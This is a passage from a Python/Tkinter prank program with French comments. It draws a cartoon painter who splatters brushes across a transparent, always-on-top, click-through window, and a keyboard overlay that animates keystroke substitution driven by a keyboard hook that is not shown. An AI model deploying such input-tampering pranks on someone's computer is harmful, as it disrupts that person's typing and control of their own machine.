                        if len(self.stuck_brushes) > 400:
                            self.stuck_brushes.pop(0)
                    else:
                        new_flying.append(b)
                self.flying_brushes = new_flying
                
                # MISE À JOUR PARTICULES
                new_rays = []
                for r in self.lightbulb_rays:
                    r["life"] -= 0.04
                    r["len"] += 0.8
                    if r["life"] > 0:
                        new_rays.append(r)
                self.lightbulb_rays = new_rays
                
                new_sw = []
                for s in self.sweat_drops:
                    s["x"] += s["vx"]
                    s["y"] += s["vy"]
                    s["vy"] += 0.3
                    s["life"] -= 0.05
                    if s["life"] > 0:
                        new_sw.append(s)
                self.sweat_drops = new_sw
                
                new_mus = []
                for mn in self.music_notes:
                    mn["y"] -= 1.2
                    mn["x"] += math.sin(mn["y"] * 0.1) * 0.8
                    mn["life"] -= 0.03
                    if mn["life"] > 0:
                        new_mus.append(mn)
                self.music_notes = new_mus
                
                new_pal = []
                for p in self.palette_splashes:
                    p["x"] += p["vx"]
                    p["y"] += p["vy"]
                    p["vy"] += 0.38
                    p["life"] -= 0.05
                    if p["life"] > 0:
                        new_pal.append(p)
                self.palette_splashes = new_pal
                
                new_f_drops = []
                for fd in self.flight_droplets:
                    fd["y"] += fd["vy"]
                    fd["life"] -= 0.035
                    if fd["life"] > 0:
                        new_f_drops.append(fd)
                self.flight_droplets = new_f_drops
                
                new_dust = []
                for du in self.dust_puffs:
                    du["r"] += 0.7
                    du["life"] -= 0.045
                    if du["life"] > 0:
                        new_dust.append(du)
                self.dust_puffs = new_dust
                
                new_shk = []
                for shk in self.shockwaves:
                    shk["r"] += 5.2
                    shk["alpha"] -= 0.05
                    if shk["alpha"] > 0 and shk["r"] < shk["max_r"]:
                        new_shk.append(shk)
                self.shockwaves = new_shk
                
                new_txts = []
                for txt in self.comic_texts:
                    txt["life"] -= 0.03
                    txt["y"] -= 0.6
                    if txt["life"] > 0:
                        new_txts.append(txt)
                self.comic_texts = new_txts
                
                # Peinture permanente : les taches et coulures restent collées à l'écran sans limite !
                for sb in self.stuck_brushes:
                    sb["vib_t"] += 0.14
                    for dr in sb["drips"]:
                        if dr["len"] < dr["max_len"]:
                            dr["len"] += dr["speed"]
                
                if self.speech_timer > 0:
                    self.speech_timer -= 1
                    
                self._draw()
            else:
                if self.visible:
                    self.visible = False
                    self.win.withdraw()
                    self.intro_done = False
                    self.anim_state = "ENTER"
                    self.state_timer = 0
                    self.flying_brushes.clear()
                    self.stuck_brushes.clear()
                    self.flight_droplets.clear()
                    self.palette_splashes.clear()
                    self.dust_puffs.clear()
                    self.music_notes.clear()
                    self.sweat_drops.clear()
                    self.lightbulb_rays.clear()
        except Exception:
            pass
        if self.master:
            self.master.after(20, self._tick)

    def _draw(self):
        self.canvas.delete("all")
        
        # 1. Gouttelettes en vol
        for fd in self.flight_droplets:
            r = fd["r"] * fd["life"]
            self.canvas.create_oval(fd["x"] - r, fd["y"] - r, fd["x"] + r, fd["y"] + r, fill=fd["color"], outline="")
            
        # 2. Éclaboussures de palette
        for p in self.palette_splashes:
            r = p["r"] * p["life"]
            self.canvas.create_oval(p["x"] - r, p["y"] - r, p["x"] + r, p["y"] + r, fill=p["color"], outline="")
            
        # 3. Ondes de choc de verre
        for shk in self.shockwaves:
            r = shk["r"]
            self.canvas.create_oval(shk["x"] - r, shk["y"] - r*0.6, shk["x"] + r, shk["y"] + r*0.6, outline="#ffffff", width=3)
            for f_ang in [0.3, 1.2, 2.5, 3.8, 5.1]:
                fx2 = shk["x"] + math.cos(f_ang) * (r * 0.85)
                fy2 = shk["y"] + math.sin(f_ang) * (r * 0.55)
                self.canvas.create_line(shk["x"], shk["y"], fx2, fy2, fill="#e2e8f0", width=1)
                
        # 4. Coulures et taches de peinture 3D bombées
        for sb in self.stuck_brushes:
            sx, sy, scolor = sb["x"], sb["y"], sb["color"]
            sr = sb["splat_r"]
            
            for dr in sb["drips"]:
                dx = sx + dr["ox"]
                dy = sy + dr["oy"]
                dlen = dr["len"]
                dw = dr["width"]
                if dlen > 2:
                    self.canvas.create_line(dx, dy, dx, dy + dlen, fill=scolor, width=int(dw), capstyle=tk.ROUND)
                    gy = dy + dlen
                    self.canvas.create_oval(dx - dw*0.95, gy - dw*0.95, dx + dw*0.95, gy + dw*1.35, fill=scolor, outline="")
                    self.canvas.create_oval(dx - dw*0.35, gy - dw*0.3, dx + dw*0.25, gy + dw*0.4, fill="#ffffff", outline="")
            
            # (Ombre de la tache de peinture supprimée selon instructions)
            pts = []
            for deg in range(0, 360, 18):
                rad = math.radians(deg)
                lobe = 1.0 + 0.44 * math.sin(deg * 3.3) + 0.20 * math.cos(deg * 2.4)
                rr = sr * lobe
                pts.append((sx + math.cos(rad) * rr, sy + math.sin(rad) * rr))
            self.canvas.create_polygon(pts, fill=scolor, outline="", smooth=True)
            
            self.canvas.create_arc(
                sx - sr * 0.72, sy - sr * 0.72, sx + sr * 0.32, sy + sr * 0.32,
                start=35, extent=105, style="arc", outline="#ffffff", width=max(3, int(sr * 0.13))
            )
            
            for ed in [18, 58, 105, 155, 210, 255, 305, 342]:
                erad = math.radians(ed)
                dist = sr * 1.68
                ex = sx + math.cos(erad) * dist
                ey = sy + math.sin(erad) * dist
                self.canvas.create_oval(ex - 4.5, ey - 4.5, ex + 4.5, ey + 4.5, fill=scolor, outline="")
                
        # 5. Manches des pinceaux plantés avec vibration harmonique amortie
        for sb in self.stuck_brushes:
            sx, sy, scolor = sb["x"], sb["y"], sb["color"]
            
            vt = sb["vib_t"]
            damping = math.exp(-vt * 3.2)
            vib_angle = sb["vib_amp"] * damping * math.sin(vt * 28.0)
            total_angle = sb["base_angle"] + vib_angle
            rad = math.radians(total_angle - 90)
            
            handle_len = 96.0
            hx2 = sx + math.cos(rad) * handle_len
            hy2 = sy + math.sin(rad) * handle_len
            
            vx1 = sx + math.cos(rad) * 15
            vy1 = sy + math.sin(rad) * 15
            self.canvas.create_line(sx, sy, vx1, vy1, fill=scolor, width=12, capstyle=tk.ROUND)
            
            vx2 = sx + math.cos(rad) * 30
            vy2 = sy + math.sin(rad) * 30
            self.canvas.create_line(vx1, vy1, vx2, vy2, fill="#94a3b8", width=10)
            self.canvas.create_line(vx1, vy1, vx2, vy2, fill="#f8fafc", width=3)
            
            self.canvas.create_line(vx2, vy2, hx2, hy2, fill="#b45309", width=8, capstyle=tk.ROUND)
            self.canvas.create_line(vx2 + math.cos(rad)*6, vy2 + math.sin(rad)*6, hx2 - math.cos(rad)*14, hy2 - math.sin(rad)*14, fill="#d97706", width=3)
            self.canvas.create_oval(hx2 - 5, hy2 - 5, hx2 + 5, hy2 + 5, fill="#78350f", outline="")
            
        # 6. Pinceau en plein vol 3D
        for b in self.flying_brushes:
            t = b["t"]
            bx = b["sx"] + (b["tx"] - b["sx"]) * t
            by = b["sy"] + (b["ty"] - b["sy"]) * t + (4 * b["arc"] * t * (1 - t))
            
            scale = 0.45 + 1.35 * t
            rot_rad = math.radians(b["rot"])
            b_len = 82.0 * scale
            
            x_tip = bx - math.cos(rot_rad) * (b_len * 0.42)
            y_tip = by - math.sin(rot_rad) * (b_len * 0.42)
            x_end = bx + math.cos(rot_rad) * (b_len * 0.58)
            y_end = by + math.sin(rot_rad) * (b_len * 0.58)
            
            self.canvas.create_line(bx, by, x_end, y_end, fill="#92400e", width=max(3, int(8 * scale)), capstyle=tk.ROUND)
            v_mid_x = bx - math.cos(rot_rad) * (b_len * 0.16)
            v_mid_y = by - math.sin(rot_rad) * (b_len * 0.16)
            self.canvas.create_line(bx, by, v_mid_x, v_mid_y, fill="#cbd5e1", width=max(4, int(9 * scale)))
            self.canvas.create_line(v_mid_x, v_mid_y, x_tip, y_tip, fill=b["color"], width=max(5, int(12 * scale)), capstyle=tk.ROUND)
            
            tail_x = bx + math.cos(rot_rad) * (b_len * 1.1)
            tail_y = by + math.sin(rot_rad) * (b_len * 1.1)
            self.canvas.create_line(x_end, y_end, tail_x, tail_y, fill="#f8fafc", width=2, dash=(4, 4))
            
        # 7. Textes de bande dessinée
        for cs in self.comic_texts:
            cx, cy = cs["x"], cs["y"]
            star_pts = []
            for sa_deg in range(0, 360, 30):
                sa = math.radians(sa_deg)
                sr = 28 if (sa_deg // 30) % 2 == 0 else 14
                star_pts.append((cx + math.cos(sa) * sr, cy + math.sin(sa) * sr))
            self.canvas.create_polygon(star_pts, fill="#facc15", outline="#ea580c", width=2)
            self.canvas.create_text(cx, cy, text=cs["text"], font=("Impact", 13, "bold"), fill="#dc2626")
            
        # 8. Poussière cartoon au sol
        for du in self.dust_puffs:
            dr = du["r"]
            self.canvas.create_oval(du["x"] - dr, du["y"] - dr*0.5, du["x"] + dr, du["y"] + dr*0.5, fill="#cbd5e1", outline="")
            
        # 9. Gouttes de sueur cartoon
        for s in self.sweat_drops:
            self.canvas.create_oval(s["x"] - 4, s["y"] - 6, s["x"] + 4, s["y"] + 6, fill="#38bdf8", outline="#0284c7", width=1)
            
        # 10. Notes de musique
        for mn in self.music_notes:
            self.canvas.create_text(mn["x"], mn["y"], text=mn["symbol"], font=("Impact", 16, "bold"), fill=mn["color"])
            
        # 11. Rayons d'illumination Eurêka
        for lr in self.lightbulb_rays:
            x2 = lr["x"] + math.cos(lr["ang"]) * lr["len"]
            y2 = lr["y"] + math.sin(lr["ang"]) * lr["len"]
            self.canvas.create_line(lr["x"], lr["y"], x2, y2, fill="#facc15", width=2)
            
        # 12. Réticule de visée lors du WINDUP
        if self.anim_state == "WINDUP":
            cx, cy = self.target_x, self.target_y
            ret_r = 24 + math.sin(self.phase * 4.0) * 4
            self.canvas.create_oval(cx - ret_r, cy - ret_r, cx + ret_r, cy + ret_r, outline="#ef4444", width=2, dash=(4, 4))
            self.canvas.create_line(cx - ret_r - 10, cy, cx + ret_r + 10, cy, fill="#ef4444", width=2)
            self.canvas.create_line(cx, cy - ret_r - 10, cx, cy + ret_r + 10, fill="#ef4444", width=2)
            self.canvas.create_text(cx, cy - ret_r - 14, text="🎯 CIBLE D'ARTISTE !", font=("Impact", 11, "bold"), fill="#ef4444")
            
        # 13. Le Personnage du Peintre Cartoon de Dessin Animé
        self._draw_theatrical_painter()

    def _draw_theatrical_painter(self):
        px = self.px
        py = self.py
        
        # CALCUL DE L'INCLINAISON ET DE L'ALTITUDE
        lean = 0.0
        if self.anim_state == "WINDUP":
            lean = 22.0
        elif self.anim_state == "THROW":
            lean = -20.0
        elif self.anim_state == "MEASURE":
            lean = 8.0
            
        body_x = px + lean * 0.65
        altitude = max(0.0, self.base_py - py)
        shadow_scale = max(0.48, 1.0 - altitude * 0.022)
        floor_y = self.floor_y
        
        # =========================================================================
        # VRAIE OMBRE CARTOON PORTÉE AU SOL (PERSPECTIVE, COUCHES ET DIFFUSION)
        # =========================================================================
        # Centre de projection de l'ombre au sol selon la lumière et l'inclinaison
        sh_x = px + 8 + (lean * 0.75)
        sh_y = floor_y
        
        # 1. Pénombre externe douce (halo d'ombre diffus)
        p_rx = 54 * shadow_scale
        p_ry = 18 * shadow_scale
        self.canvas.create_oval(sh_x - p_rx, sh_y - p_ry, sh_x + p_rx, sh_y + p_ry, fill="#1e293b", outline="")
        
        # 2. Ombre portée du corps et du torse
        b_rx = 40 * shadow_scale
        b_ry = 14 * shadow_scale
        self.canvas.create_oval(sh_x - b_rx, sh_y - b_ry, sh_x + b_rx, sh_y + b_ry, fill="#0f172a", outline="")
        
        # 3. Ombre portée de la tête et du béret (projetée vers l'arrière selon le lean)
        h_sh_x = sh_x + (lean * 0.45) + 6
        h_sh_y = sh_y - 2
        h_rx = 24 * shadow_scale
        h_ry = 10 * shadow_scale
        self.canvas.create_oval(h_sh_x - h_rx, h_sh_y - h_ry, h_sh_x + h_rx, h_sh_y + h_ry, fill="#0f172a", outline="")
        
        # 4. Ombre portée de la palette sur le côté gauche
        pal_sh_x = sh_x - (36 * shadow_scale)
        pal_sh_y = sh_y + 1
        pal_rx = 18 * shadow_scale
        pal_ry = 9 * shadow_scale
        self.canvas.create_oval(pal_sh_x - pal_rx, pal_sh_y - pal_ry, pal_sh_x + pal_rx, pal_sh_y + pal_ry, fill="#0f172a", outline="")
        
        # 5. Cœur d'ombre profond d'occlusion au sol (Umbra centrale sous le centre de masse)
        core_rx = 26 * shadow_scale
        core_ry = 8 * shadow_scale
        self.canvas.create_oval(sh_x - core_rx, sh_y - core_ry, sh_x + core_rx, sh_y + core_ry, fill="#020617", outline="")
        
        # 6. Ombres de contact direct sous les semelles des chaussures (quand au sol)
        if altitude < 4.0:
            self.canvas.create_oval(px - 34, floor_y - 3, px - 6, floor_y + 5, fill="#000000", outline="")
            self.canvas.create_oval(px + 6, floor_y - 3, px + 34, floor_y + 5, fill="#000000", outline="")
            
        # =========================================================================
        # LE PERSONNAGE DU PEINTRE
        # =========================================================================
        # CHAUSSURES D'ARTISTE EN CUIR
        self.canvas.create_oval(px - 34, py + 30, px - 6, py + 46, fill="#78350f", outline="#451a03", width=2)
        self.canvas.create_oval(px + 6, py + 30, px + 34, py + 46, fill="#78350f", outline="#451a03", width=2)
        self.canvas.create_rectangle(px - 22, py + 34, px - 16, py + 40, outline="#facc15", width=2)
        self.canvas.create_rectangle(px + 16, py + 34, px + 22, py + 40, outline="#facc15", width=2)
        
        # PANTALON EN VELOURS CÔTELÉ ANTHRACITE
        self.canvas.create_rectangle(px - 26, py + 18, px + 26, py + 36, fill="#1e293b", outline="#0f172a", width=2)
        
        # TABLIER D'ARTISTE PEINTRE AVEC POCHE VENTRALE ET TÂCHES
        self.canvas.create_polygon([
            (px - 24, py - 10), (px + 24, py - 10),
            (px + 28, py + 26), (px - 28, py + 26)
        ], fill="#f8fafc", outline="#0f172a", width=2)
        self.canvas.create_rectangle(px - 16, py + 8, px + 16, py + 24, fill="#e2e8f0", outline="#94a3b8", width=1)
        self.canvas.create_line(px - 8, py + 12, px - 12, py - 4, fill="#b45309", width=3)
        self.canvas.create_oval(px - 14, py - 8, px - 10, py - 4, fill="#3b82f6", outline="")
        self.canvas.create_oval(px - 12, py + 2, px - 6, py + 8, fill="#ef4444", outline="")
        self.canvas.create_oval(px + 8, py + 10, px + 14, py + 16, fill="#3b82f6", outline="")
        self.canvas.create_oval(px - 4, py + 16, px + 2, py + 22, fill="#facc15", outline="")
        self.canvas.create_oval(px + 6, py + 2, px + 11, py + 7, fill="#10b981", outline="")
        
        # MARINIÈRE BRETONNE RAYÉE BLEUE ET BLANCHE
        self.canvas.create_oval(body_x - 34, py - 28, body_x + 34, py + 26, fill="#ffffff", outline="#0f172a", width=3)
        for ry in range(-18, 24, 8):
            self.canvas.create_line(body_x - 30, py + ry, body_x + 30, py + ry, fill="#1d4ed8", width=4)
            
        # FOULARD / CRAVATE ROUGE DE SOIE
        self.canvas.create_polygon([
            (body_x - 18, py - 26), (body_x, py - 18), (body_x + 18, py - 26),
            (body_x + 8, py - 8), (body_x - 8, py - 8)
        ], fill="#dc2626", outline="#7f1d1d", width=2)
        self.canvas.create_polygon([(body_x - 4, py - 8), (body_x - 10, py + 2), (body_x, py - 2)], fill="#dc2626", outline="")
        self.canvas.create_polygon([(body_x + 4, py - 8), (body_x + 10, py + 2), (body_x, py - 2)], fill="#dc2626", outline="")
        
        # PALETTE DE PEINTRE EN BOIS
        pal_x = body_x - 50
        pal_y = py + 6
        self.canvas.create_oval(pal_x - 30, pal_y - 22, pal_x + 30, pal_y + 22, fill="#d97706", outline="#78350f", width=3)
        self.canvas.create_oval(pal_x - 20, pal_y - 8, pal_x - 10, pal_y + 8, fill="#fed7aa", outline="#78350f", width=2)
        palette_spots = ["#ef4444", "#3b82f6", "#facc15", "#10b981", "#a855f7", "#ea580c"]
        for pi, pc in enumerate(palette_spots):
            pdeg = math.radians(pi * 44 - 30)
            spot_x = pal_x + math.cos(pdeg) * 18
            spot_y = pal_y + math.sin(pdeg) * 12
            self.canvas.create_oval(spot_x - 5, spot_y - 5, spot_x + 5, spot_y + 5, fill=pc, outline="")
            self.canvas.create_oval(spot_x - 2, spot_y - 3, spot_x + 1, spot_y, fill="#ffffff", outline="")
            
        # BRAS ET GESTUELLE
        arm_start_x = body_x + 24
        arm_start_y = py - 16
        
        if self.anim_state in ("ENTER", "MEASURE"):
            hand_x = body_x - 20
            hand_y = py - 46
            self.canvas.create_line(arm_start_x, arm_start_y, hand_x, hand_y, fill="#fed7aa", width=9, capstyle=tk.ROUND)
            self.canvas.create_oval(hand_x - 8, hand_y - 8, hand_x + 8, hand_y + 8, fill="#fed7aa", outline="#c2410c", width=2)
            self.canvas.create_line(hand_x, hand_y, hand_x, hand_y - 20, fill="#fed7aa", width=6, capstyle=tk.ROUND)
            self.canvas.create_line(hand_x, hand_y, hand_x - 16, hand_y + 20, fill="#92400e", width=4)
            self.canvas.create_line(hand_x - 16, hand_y + 20, hand_x - 24, hand_y + 28, fill=self.current_color, width=6, capstyle=tk.ROUND)
            
        elif self.anim_state == "EUREKA":
            hand_x = body_x - 6
            hand_y = py - 65
            self.canvas.create_line(arm_start_x, arm_start_y, hand_x, hand_y, fill="#fed7aa", width=9, capstyle=tk.ROUND)
            self.canvas.create_oval(hand_x - 7, hand_y - 7, hand_x + 7, hand_y + 7, fill="#fed7aa", outline="#c2410c", width=2)
            self.canvas.create_line(hand_x, hand_y, hand_x, hand_y - 15, fill="#fed7aa", width=5, capstyle=tk.ROUND)
            bulb_y = py - 95
            self.canvas.create_oval(hand_x - 12, bulb_y - 12, hand_x + 12, bulb_y + 12, fill="#fef08a", outline="#ca8a04", width=2)
            self.canvas.create_rectangle(hand_x - 5, bulb_y + 10, hand_x + 5, bulb_y + 16, fill="#94a3b8", outline="#475569", width=1)
            self.canvas.create_text(hand_x, bulb_y, text="💡", font=("Segoe UI Emoji", 14))
            
        elif self.anim_state in ("MIX", "RELOAD"):
            hand_x = pal_x + 10
            hand_y = pal_y - 10
            self.canvas.create_line(arm_start_x, arm_start_y, hand_x, hand_y, fill="#fed7aa", width=9, capstyle=tk.ROUND)
            self.canvas.create_line(hand_x, hand_y - 16, hand_x, hand_y + 12, fill="#92400e", width=4)
            self.canvas.create_line(hand_x, hand_y + 12, hand_x, hand_y + 22, fill=self.current_color, width=8, capstyle=tk.ROUND)
            self.canvas.create_oval(hand_x - 6, hand_y - 6, hand_x + 6, hand_y + 6, fill="#fed7aa", outline="#c2410c", width=2)
            
        elif self.anim_state == "WINDUP":
            w_rad = math.radians(self.windup_angle)
            w_len = 58.0
            hand_x = arm_start_x + math.cos(w_rad) * w_len
            hand_y = arm_start_y + math.sin(w_rad) * w_len
            self.canvas.create_line(arm_start_x, arm_start_y, hand_x, hand_y, fill="#fed7aa", width=9, capstyle=tk.ROUND)
            self.canvas.create_oval(arm_start_x - w_len, arm_start_y - w_len, arm_start_x + w_len, arm_start_y + w_len, outline="#f8fafc", width=2, dash=(6, 4))
            px2 = hand_x + math.cos(w_rad + math.pi/2) * 34
            py2 = hand_y + math.sin(w_rad + math.pi/2) * 34
            self.canvas.create_line(hand_x, hand_y, px2, py2, fill="#92400e", width=5)
            self.canvas.create_line(px2, py2, px2 + math.cos(w_rad + math.pi/2)*16, py2 + math.sin(w_rad + math.pi/2)*16, fill=self.current_color, width=8, capstyle=tk.ROUND)
            
        elif self.anim_state == "THROW":
            hand_x = body_x - 44
            hand_y = py - 48
            self.canvas.create_line(arm_start_x, arm_start_y, hand_x, hand_y, fill="#fed7aa", width=9, capstyle=tk.ROUND)
            for offy in [-10, 0, 10]:
                self.canvas.create_line(hand_x, hand_y + offy, hand_x - 55, hand_y + offy - 14, fill="#ffffff", width=3, dash=(4, 4))
                
        # TÊTE EXPRESSIVE
        head_x = body_x
        head_y = py - 46
        self.canvas.create_oval(head_x - 25, head_y - 25, head_x + 25, head_y + 25, fill="#fed7aa", outline="#c2410c", width=2)
        self.canvas.create_oval(head_x - 22, head_y + 2, head_x - 12, head_y + 12, fill="#fca5a5", outline="")
        self.canvas.create_oval(head_x + 12, head_y + 2, head_x + 22, head_y + 12, fill="#fca5a5", outline="")
        
        # BÉRET ROUGE
        beret_tilt = -10 if self.anim_state == "WINDUP" else (6 if self.anim_state == "MEASURE" else 0)
        if self.anim_state == "THROW":
            beret_tilt = -18
        self.canvas.create_oval(head_x - 34, head_y - 36 + beret_tilt, head_x + 26, head_y - 14 + beret_tilt, fill="#dc2626", outline="#7f1d1d", width=3)
        self.canvas.create_line(head_x - 6, head_y - 36 + beret_tilt, head_x - 6, head_y - 43 + beret_tilt, fill="#7f1d1d", width=3)
        
        # YEUX
        if self.anim_state == "MEASURE":
            self.canvas.create_line(head_x + 4, head_y - 6, head_x + 16, head_y - 6, fill="#0f172a", width=3)
            self.canvas.create_oval(head_x - 18, head_y - 14, head_x - 4, head_y + 2, fill="#0f172a", outline="")
            self.canvas.create_oval(head_x - 14, head_y - 11, head_x - 8, head_y - 5, fill="#ffffff", outline="")
        elif self.anim_state == "WINDUP":
            self.canvas.create_oval(head_x - 18, head_y - 13, head_x - 3, head_y + 2, fill="#f59e0b", outline="#713f12", width=2)
            self.canvas.create_oval(head_x + 3, head_y - 13, head_x + 18, head_y + 2, fill="#f59e0b", outline="#713f12", width=2)
            self.canvas.create_line(head_x - 11, head_y - 11, head_x - 11, head_y, fill="#0f172a", width=3)
            self.canvas.create_line(head_x + 11, head_y - 11, head_x + 11, head_y, fill="#0f172a", width=3)
        elif self.anim_state == "EUREKA":
            self.canvas.create_oval(head_x - 18, head_y - 16, head_x - 2, head_y, fill="#ffffff", outline="#0f172a", width=2)
            self.canvas.create_oval(head_x + 2, head_y - 16, head_x + 18, head_y, fill="#ffffff", outline="#0f172a", width=2)
            self.canvas.create_oval(head_x - 12, head_y - 11, head_x - 6, head_y - 5, fill="#0f172a", outline="")
            self.canvas.create_oval(head_x + 6, head_y - 11, head_x + 12, head_y - 5, fill="#0f172a", outline="")
        else:
            self.canvas.create_oval(head_x - 16, head_y - 11, head_x - 4, head_y + 1, fill="#0f172a", outline="")
            self.canvas.create_oval(head_x + 4, head_y - 11, head_x + 16, head_y + 1, fill="#0f172a", outline="")
            self.canvas.create_oval(head_x - 13, head_y - 9, head_x - 8, head_y - 5, fill="#ffffff", outline="")
            self.canvas.create_oval(head_x + 8, head_y - 9, head_x + 13, head_y - 5, fill="#ffffff", outline="")
            
        # SOURCILS
        if self.anim_state == "WINDUP":
            self.canvas.create_line(head_x - 18, head_y - 14, head_x - 4, head_y - 18, fill="#451a03", width=3)
            self.canvas.create_line(head_x + 4, head_y - 18, head_x + 18, head_y - 14, fill="#451a03", width=3)
        elif self.anim_state == "MEASURE":
            self.canvas.create_line(head_x - 18, head_y - 17, head_x - 4, head_y - 17, fill="#451a03", width=3)
            self.canvas.create_line(head_x + 4, head_y - 15, head_x + 18, head_y - 12, fill="#451a03", width=3)
        else:
            self.canvas.create_arc(head_x - 18, head_y - 20, head_x - 4, head_y - 10, start=30, extent=120, style="arc", outline="#451a03", width=3)
            self.canvas.create_arc(head_x + 4, head_y - 20, head_x + 18, head_y - 10, start=30, extent=120, style="arc", outline="#451a03", width=3)
            
        # NEZ
        self.canvas.create_oval(head_x - 6, head_y - 3, head_x + 6, head_y + 7, fill="#fca5a5", outline="#c2410c", width=1)
        
        # MOUSTACHE
        mustache_bob = math.sin(self.phase * 2.0) * 1.5
        m_pts = [
            (head_x - 30, head_y + 5 - mustache_bob),
            (head_x - 14, head_y + 12 + mustache_bob),
            (head_x, head_y + 9),
            (head_x + 14, head_y + 12 + mustache_bob),
            (head_x + 30, head_y + 5 - mustache_bob)
        ]
        self.canvas.create_line(m_pts, fill="#0f172a", width=5, smooth=True)
        
        # BULLE DE DIALOGUE
        if self.speech_timer > 0:
            bx = body_x - 60
            by = py - 105
            self.canvas.create_rectangle(bx - 155, by - 18, bx + 155, by + 18, fill="#fef08a", outline="#ca8a04", width=2)
            self.canvas.create_polygon([(bx + 20, by + 18), (bx + 10, by + 30), (bx, by + 18)], fill="#fef08a", outline="#ca8a04", width=1)
            self.canvas.create_text(bx, by, text=self.speech_text, font=("Impact", 11, "bold"), fill="#0f172a")


class CartoonKeysOverlay:
    """
    Clavier fou cartoon hyper-réaliste :
    Affiche côte à côte deux touches de clavier mécanique 3D (profil PBT concave, switches MX,
    ressorts métalliques hélicoïdaux et illumination).
    Quand l'utilisateur tape une touche (ex: 'K') :
    - La touche 'K' commence à s'enfoncer.
    - Un gremlin farceur surgit et ÉCRASE violemment une autre touche (ex: 'E') avec un maillet géant !
    - La touche 'E' s'écrase jusqu'au fond avec ondes de choc, étincelles ⚡ et "CLACK !".
    - La touche 'K' de l'utilisateur est violemment repoussée en l'air sur son ressort avec un "❓ NON !".
    """
    def __init__(self, master):
        self.master = master
        self.win = tk.Toplevel(master)
        self.win.overrideredirect(True)
        self.win.attributes("-topmost", True)
        self.win.attributes("-transparentcolor", "#010101")
        self.win.configure(bg="#010101")
        self.win.withdraw()
        
        self.w, self.h = 480, 320
        self.sw = self.win.winfo_screenwidth()
        self.sh = self.win.winfo_screenheight()
        self.win.geometry(f"{self.w}x{self.h}+{self.sw - self.w - 40}+{self.sh - self.h - 100}")
        
        self.canvas = tk.Canvas(self.win, width=self.w, height=self.h, bg="#010101", highlightthickness=0)
        self.canvas.pack(fill="both", expand=True)
        
        try:
            self.win.update_idletasks()
            self.hwnd = ctypes.windll.user32.GetParent(self.win.winfo_id()) or self.win.winfo_id()
            ex = ctypes.windll.user32.GetWindowLongW(self.hwnd, -20)
            ctypes.windll.user32.SetWindowLongW(
                self.hwnd, -20,
                ex | 0x00080000 | 0x00000020 | 0x00000080 | 0x08000000
            )
        except Exception:
            self.hwnd = None
            
        self.phase = 0.0
        self.visible = False
        self._loop_active = True
        
        # Données d'état de l'échange de touches
        self.user_char = "K"
        self.prank_char = "E"
        self.anim_t = 0.0
        self.is_animating = False
        
        self.user_key_depth = 0.0
        self.prank_key_depth = 0.0
        self.user_key_recoil = 0.0
        
        self.sparks = []
        self.shockwaves = []
        self.bubble_text = ""
        self.bubble_timer = 0
        
        self._tick()

    def trigger_key_swap(self, chosen_char, replaced_char):
        """Déclenché depuis le hook clavier quand l'utilisateur tape chosen_char et que replaced_char est produit."""
        self.user_char = str(chosen_char).upper()
        self.prank_char = str(replaced_char).upper()
        self.anim_t = 0.0
        self.is_animating = True
        self.bubble_text = f"NON ! C'EST '{self.prank_char}' ! 😂"
        self.bubble_timer = 45

    def trigger_hit(self, char):
        """Compatibilité ascendante."""
        self.trigger_key_swap("?", char)

    def _tick(self):
        if not self._loop_active:
            return
        try:
            global keys_state
            if keys_state.get("active", False):
                if not self.visible:
                    self.visible = True
                    self.win.deiconify()
                    self.win.lift()
                    
                self.phase += 0.18
                
                # Gestion de l'animation séquentielle du swap
                if self.is_animating:
                    self.anim_t += 0.045
                    t = self.anim_t
                    
                    if t < 0.20:
                        prog = t / 0.20
                        self.user_key_depth = 8.0 * prog
                        self.prank_key_depth = 0.0
                        self.user_key_recoil = 0.0
                    elif t < 0.35:
                        prog = (t - 0.20) / 0.15
                        self.prank_key_depth = 22.0 * prog
                        if len(self.shockwaves) == 0:
                            self.shockwaves.append({"r": 10, "max_r": 65, "alpha": 1.0})
                            for _ in range(8):
                                self.sparks.append({
                                    "x": 330 + random.uniform(-20, 20),
                                    "y": 200 + random.uniform(-10, 10),
                                    "vx": random.uniform(-6, 6),
                                    "vy": random.uniform(-8, -2),
                                    "life": 1.0
                                })
                    elif t < 0.65:
                        prog = (t - 0.35) / 0.30
                        self.prank_key_depth = 22.0 * (1.0 - prog * 0.4)
                        self.user_key_depth = 0.0
                        self.user_key_recoil = math.sin(prog * math.pi) * 26.0
                    else:
                        prog = (t - 0.65) / 0.35
                        damping = math.exp(-prog * 4.0)
                        self.prank_key_depth = 12.0 * damping * math.cos(prog * 12.0)
                        self.user_key_recoil = 8.0 * damping * math.sin(prog * 14.0)
                        if t >= 1.1:
                            self.is_animating = False
                            self.user_key_depth = 0.0
                            self.prank_key_depth = 0.0
                            self.user_key_recoil = 0.0
                else:
                    self.user_key_depth = 0.0
                    self.prank_key_depth = 0.0
                    self.user_key_recoil = 0.0
                    
                # Mise à jour des ondes de choc
                new_waves = []
                for sw in self.shockwaves:
                    sw["r"] += 4.5
                    sw["alpha"] -= 0.07
                    if sw["alpha"] > 0 and sw["r"] < sw["max_r"]:
                        new_waves.append(sw)
                self.shockwaves = new_waves
                
                # Mise à jour des étincelles
                new_sparks = []
                for sp in self.sparks:
                    sp["x"] += sp["vx"]
                    sp["y"] += sp["vy"]
                    sp["vy"] += 0.6
                    sp["life"] -= 0.08
                    if sp["life"] > 0:
                        new_sparks.append(sp)
                self.sparks = new_sparks
                
                if self.bubble_timer > 0:
                    self.bubble_timer -= 1
                    
                self._draw()
            else:
                if self.visible:
                    self.visible = False
                    self.win.withdraw()
                    self.sparks.clear()
                    self.shockwaves.clear()
        except Exception:
            pass
        if self.master:
            self.master.after(20, self._tick)

    def _draw_mechanical_key(self, kx, ky, char, label_text, is_user_key, depth, recoil):
        actual_y = ky + depth - recoil
        
        # Plaque de montage aluminium
        base_w, base_h = 100, 36
        self.canvas.create_rectangle(kx - base_w//2, ky + 14, kx + base_w//2, ky + 14 + base_h, fill="#1e293b", outline="#0f172a", width=2)
        self.canvas.create_rectangle(kx - base_w//2 + 4, ky + 18, kx + base_w//2 - 4, ky + 14 + base_h - 4, fill="#0f172a", outline="")
        
        # Ressort hélicoïdal métallique
        spring_bottom = ky + 16
        spring_top = actual_y + 12
        spring_h = max(6, spring_bottom - spring_top)
        coils = 5
        pts = [(kx, spring_bottom)]
        for c in range(coils):
            cw = 8 if c % 2 == 0 else -8
            cy_step = spring_bottom - (c + 1) * (spring_h / float(coils))
            pts.append((kx + cw, cy_step))
        for i in range(len(pts) - 1):
